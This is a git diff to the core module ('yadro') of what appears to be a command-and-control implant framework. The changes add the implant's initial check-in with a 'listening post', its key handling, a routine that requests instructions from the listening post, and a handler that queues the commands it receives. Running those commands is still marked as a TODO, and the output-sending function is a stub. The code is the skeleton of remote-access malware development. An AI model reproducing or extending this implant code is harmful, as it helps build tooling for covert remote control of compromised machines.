@@ -1,4 +1,6 @@
 # ядро - core
+import ast
+
 from lib import instructions
 from lib import transmit
 from lib.crypto import asymmetric
@@ -29,10 +31,10 @@ def rekey(frame, component):
     :param component:
     :return:
     """
-    data = init(frame, component)
-    component.current_lp_pubkey = asymmetric.public_key_from_bytes(str(frame['args'][0]['lpk']))
+    # TODO: Key rotation
     component.current_private_key = component.initial_private_key
     component.current_public_key = component.initial_public_key
+    data = init(frame, component)
 
     instruction_frame = instructions.create_instruction_frame(data)
     reply_frame = transmit.cook_transmit_frame(component, instruction_frame)
@@ -40,8 +42,24 @@ def rekey(frame, component):
 
 
 def getcmd(frame, component):
-    # TODO: Implement me
+    # TODO: Key rotation
+    component.current_lp_pubkey = asymmetric.public_key_from_bytes(str(frame['args'][1]['lpk']))
+    component.current_private_key = component.initial_private_key
+    component.current_public_key = component.initial_public_key
+
+    if len(frame['args'][0]) == 0:
+        # We got no commands, go to sleep
+        return 0
+    else:
+        for command in frame['args'][0]:
+            component.cmd_queue.append(command)
+            # TODO: Execute the commands
     return None
+
+
+def send_cmd_output(component):
+    for command in component.cmd_done_queue:
+        print("command")
 
 
 def import_transport_for_implant(component, transport_config):
@@ -62,7 +80,7 @@ def import_transport_for_implant(component, transport_config):
                               level="error", source="lib.yadro")
 
 
-def connect_to_lp(component):
+def generate_init_frame(component):
     data = {'component_id': component.component_id, "cmd": "ii", "args": [{"manifest": component.manifest}, {"ipk": component.initial_public_key._public_key}]}
     instruction_frame = instructions.create_instruction_frame(data)
     reply_frame = transmit.cook_sealed_frame(component, instruction_frame)
@@ -92,6 +110,23 @@ def retrieve_output(component):
 def relay_init_frame(component, reply):
     try:
         component.transport.send_data(reply)
+        init_response = component.transport.recv_data()
+        uncooked_frame = ast.literal_eval(transmit.uncook_transmit_frame(component, init_response).decode('utf-8'))
+        return uncooked_frame
     except Exception as e:
         component.logging.log(f"Critical [{type(e).__name__}] when relaying init: {e}",
+                              level="critical", source=f"lib.yadro")
+
+
+def request_instructions(component):
+    try:
+        data = {'component_id': component.component_id, "cmd": "icmdr", "args": [{"ipk": component.current_public_key._public_key}]}
+        instruction_frame = instructions.create_instruction_frame(data)
+        request_frame = transmit.cook_transmit_frame(component, instruction_frame)
+        component.transport.send_data(request_frame)
+        reply = component.transport.recv_data()
+        uncooked_frame = ast.literal_eval(transmit.uncook_transmit_frame(component, reply).decode('utf-8'))
+        return uncooked_frame
+    except Exception as e:
+        component.logging.log(f"Critical [{type(e).__name__}] when requesting instructions: {e}",
                               level="critical", source=f"lib.yadro")
